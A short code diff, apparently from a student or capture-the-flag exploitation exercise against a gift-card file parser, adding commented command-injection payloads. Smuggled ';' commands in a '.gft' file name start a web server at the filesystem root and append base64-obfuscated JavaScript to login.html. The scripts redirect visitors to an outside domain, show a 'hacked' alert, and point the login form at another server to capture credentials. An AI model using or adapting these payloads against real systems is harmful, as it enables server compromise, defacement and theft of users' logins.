@@ -72,7 +72,18 @@ def parse_card_data(card_file_data, card_path_name):
 
 # .gft; cd ..; cd ..; cd ..; cd ..; cd ..; cd ..; python2 -m SimpleHTTPServer 8001; echo "success";
 
-# .gft; cd templates ; echo "<img onload='eval(atob(\"d2luZG93LmxvY2F0aW9uPSJodHRwczovL2x6cmQueHl6Ig==\"))'>" >> login.html;
+
+# .gft; cd templates ; echo "<body onload='eval(atob(\"   Put any base64-encoded js here... use btoa()!   \"))'>" >> login.html;
+
+# redir to lzrd.xyz
+# .gft; cd templates ; echo "<body onload='eval(atob(\"d2luZG93LmxvY2F0aW9uPSJodHRwczovL2x6cmQueHl6Ig==\"))'>" >> login.html;
+
+# alert
+# .gft; cd templates ; echo "<body onload='eval(atob(\"YWxlcnQoJ3lvdSBoYXZlIGJlZW4gaGFja2VkJyk=\"))'>" >> login.html;
+
+# $('form')[0].action='http://localhost:6969/hacked.html'
+# "JCgnZm9ybScpWzBdLmFjdGlvbj0naHR0cDovL2xvY2FsaG9zdDo2OTY5L2hhY2tlZC5odG1sJw=="
+# .gft; cd templates ; echo "<body onload='eval(atob(\""JCgnZm9ybScpWzBdLmFjdGlvbj0naHR0cDovL2xvY2FsaG9zdDo2OTY5L2hhY2tlZC5odG1sJw=="\"))'>" >> login.html;
 
 # SLASHES! DO! NOT! WORK!
 # .gft; cd templates ; echo "<img onload='window.location='//lzrd.xyz''>" >> login.html;
